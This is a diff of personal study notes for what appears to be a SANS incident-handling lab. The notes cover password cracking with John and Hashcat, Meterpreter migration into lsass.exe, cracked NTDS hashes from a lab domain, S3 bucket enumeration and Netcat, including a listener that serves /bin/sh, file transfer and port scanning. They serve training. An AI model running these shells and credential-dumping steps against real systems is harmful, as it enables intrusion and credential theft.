@@ -2,7 +2,7 @@
 
 __Credential stuffing:__ use passwords cracked from previous data breaches to supplement current lists for dictionary attacks/ rainbow tables.
 
-__Password spraying:__ 
+__Password spraying:__ trying a small number of passwords against a large number of accounts.
 
 __Salting__ passwords makes __rainbow__ attacks difficult because random nonce added.
 
@@ -131,9 +131,21 @@ msf6 auxiliary(scanner/ssh/ssh_login) > run
 [*] Auxiliary module execution completed
 ```
 
+Use `lsass.exe` to obtain local Windows paswords as opposed to domain hashes from NTDS.dit with:
+
+```powershell
+# Assumes you have a Meterpreter session and are in a SYSTEM process
+migrate -N lsass.exe
+```
+
 ## 3.2 John the Ripper
 
-__ALL UPPERCASE CHARACTERS IN JOHN PASS OUTPUT = LANMAN ALGO__
+__ALL UPPERCASE CHARACTERS__ in John pass output = LANMAN ALGO
+
+LANMAN hash for empty password:
+`Administrator:500:aad3b435b51404eeaad3b435b51404ee:8118cb8789b3a147c790db402b016a08:::`
+
+NTLM blank password: `31d6cfe0d16ae931b73c59d7e0c089c0`
 
 ```bash
 # Unshadow the shadow and passwd files
@@ -150,7 +162,8 @@ harukori         (hrio)
 alucasta         (alucasta)    
 
 # Using a wordlist
-john --format=descrypt --wordlist=/usr/local/share/john/password.lst combined
+john --format=descrypt --wordlist=/usr/local/share/john/password.lst /
+combined
 
 Using default input encoding: UTF-8
 Loaded 7 password hashes with 7 different salts (descrypt, traditional crypt(3) [DES 512/512 AVX512F])
@@ -159,10 +172,10 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Victoria         (lrenate)     
 Front242         (jorestes)     
 Wolverin         (beva)     
-3g 0:00:00:00 DONE (2022-07-13 17:56) 42.85g/s 50600p/s 354200c/s 354200C/s 123456..sss
-Use the "--show" option to display all of the cracked passwords reliably
-
+Use the "--show" option to display all of the cracked passwords 
 ```
+
+__John cracking mode order:__ single, wordlist, incremental.
 
 Common hash types:
 
@@ -190,6 +203,13 @@ __Modes:__
   6 | Hybrid Wordlist + Mask
   7 | Hybrid Mask + Wordlist
   9 | Association
+
+__Masks:__
+
+- ?u: abcdefghijklmnopqrstuvwxyz
+- ?l: ABCDEFGHIJKLMNOPQRSTUVWXYZ
+- ?d: 0123456789
+- ?s: !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
 
 __Hash types:__
 
@@ -230,15 +250,6 @@ bastor_history3:1656:aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407
 bedgecumbe:1657:aad3b435b51404eeaad3b435b51404ee:53d9b295043d109b842e183b623dc83d:::
 bedgecumbe_history0:1657:aad3b435b51404eeaad3b435b51404ee:b754bead1f158670ae5d0fa04ec356a3:::
 bedgecumbe_history1:1657:aad3b435b51404eeaad3b435b51404ee:20f75dd54195ab85b28a672465f4458d:::
-sburns:1658:aad3b435b51404eeaad3b435b51404ee:207a51a61330813bc6d4e0e0a068da0b:::
-sburns_history0:1658:aad3b435b51404eeaad3b435b51404ee:589b85762d8ab451401df29aa7fdc417:::
-sburns_history1:1658:aad3b435b51404eeaad3b435b51404ee:3af6bb62b9c4a31150a09cf0d6350a2f:::
-sburns_history2:1658:aad3b435b51404eeaad3b435b51404ee:7c89b1faec90cc70eb088137a2108341:::
-phouston:1659:aad3b435b51404eeaad3b435b51404ee:4ecd6d8d58986494b758f678a5fb36ee:::
-phouston_history0:1659:aad3b435b51404eeaad3b435b51404ee:59728aded00dd868799906792b3a1c1b:::
-phouston_history1:1659:aad3b435b51404eeaad3b435b51404ee:d4a2b62b0197b740bd5f5481140daef7:::
-phouston_history2:1659:aad3b435b51404eeaad3b435b51404ee:59b9eb62ca9889938d51185cc8b74560:::
-phouston_history3:1659:aad3b435b51404eeaad3b435b51404ee:3544ee8b52a89130d58de7487faf9147:::
 ...
 
 cat w99.ntds | awk -F: '{print $3}' | sort | uniq -c
@@ -259,17 +270,6 @@ cf53f44fe2052801de29de20eafffafd:07905687007Jf
 5a0602424d9e911fe26bac1edd256a1e:0285dru03D      
 5dd58c9717d862b25868d345e93a9324:020707Giovani   
 bb9b5f895d1b974b0eae9d542282c11d:01Jan1979       
-4ce0d3ea854dcbd05813b2341f6adfb9:--HoSaNa226     
-5d91dbe3311568414d09f3da9241b715:,]iydcoU9       
-cd491d35364db43490063666b7df9f03:*Desi89*        
-cf82d1c8b43ba55d61fcd7aba2fabca8:)4000Eaj        
-c11ab2f77e5ea8c659f39a2efbdf04ed:$hiRani36       
-a8cef12b7157546feb45ea642e4e8194:$Combine1       
-ce896fde9b6911d20285e86e58ea2752:$@M0\\'Nei!!    
-43d78b7ab5351a8f6ab467d378369438:$!hoSs99!$      
-c18e5e3f6ccb39cb66d271a90be49049:#1NemoBoo       
-5d5b36a10095b33924c618065b57a087:#1Floresita.    
-a6199326f6091aeaeb35d55d5365b739:##1104SoRi
 ... 
 
 # from DPAT directory
@@ -280,7 +280,9 @@ python dpat.py -n ../Wardrobe99/w99.ntds -c ../Wardrobe99/w99.potfile -g ../Ward
 
 ![DPAT](img/lab3/DPAT.PNG)
 
-## 3.5 Cloud Bucket Discovery
+## 3.5 Cloud Access Attacks
+
+==__pgs: 66-78__==
 
 __BucketFinder:__
 
@@ -300,10 +302,6 @@ sec504@slingshot:~$ aws s3 ls s3://mybucket2/
 
 # Try to access falsimentis company bucket
 aws s3 ls s3://www.falsimentis.com
-                           PRE about/
-                           PRE author/
-                           PRE categories/
-                           PRE contact/
                            PRE images/
                            PRE js/
                            PRE message_sent/
@@ -345,10 +343,24 @@ Bucket found but access denied: dev
 Bucket Found: movies ( http://s3.amazonaws.com/movies )
 	<Public> http://s3.amazonaws.com/movies/movies.json
 Bucket found but access denied: prod
-
 ```
 
+### Misc. Cloud Access Tools
+
+- __gcpbucketbrute:__ identifies presence of storage buckets and permissions associated with each bucket
+- __basicblobfinder:__ identify publicly accessible Azure blobs and enumerate files within
+
+Cloud providers ofter reveal the cloud provider and bucket name as part of the HTTP Server Name Indication (SNI) field.
+
+### Defenses
+
+1. Use DNS, HTTP proxy, and network logs to identify cloud storage use.
+2. Use creative naming conventions for buckets
+3. Examine buckets and files for disclosure threats and ownership
+
 ## 3.6 Netcat
+
+==__pgs. 82-93__==
 
 ```bash
 # Creates a NC listener on port 2222 and executes /bin/sh upon connection
@@ -384,3 +396,25 @@ sec504@slingshot:~$ curl http://172.30.0.50:8080
 ```
 
 NC can also be used for SMB relays by just listening on port 445 and using `sudo` since Linux only allows `root` to listen on ports lower than `1024`.
+
+### NC Data Transfer
+
+Send file from listener back to client:
+
+listener: `nc -l -p 1234 < filename`
+client: `nc listenerIP 1234 > filename`
+
+Send file from client to listener:
+
+listener: `nc -l -p 1234 > filename`
+client: `nc listenerIP 1234 < filename`
+
+### NC Port Scanning
+
+`nc -v -w3 -z targetIP start_port-end_port`
+
+Flags:
+
+- -z: minimal data to be sent
+- -v: tells attacker when a connection is made
+- -w3: wait no more than three secs on each port
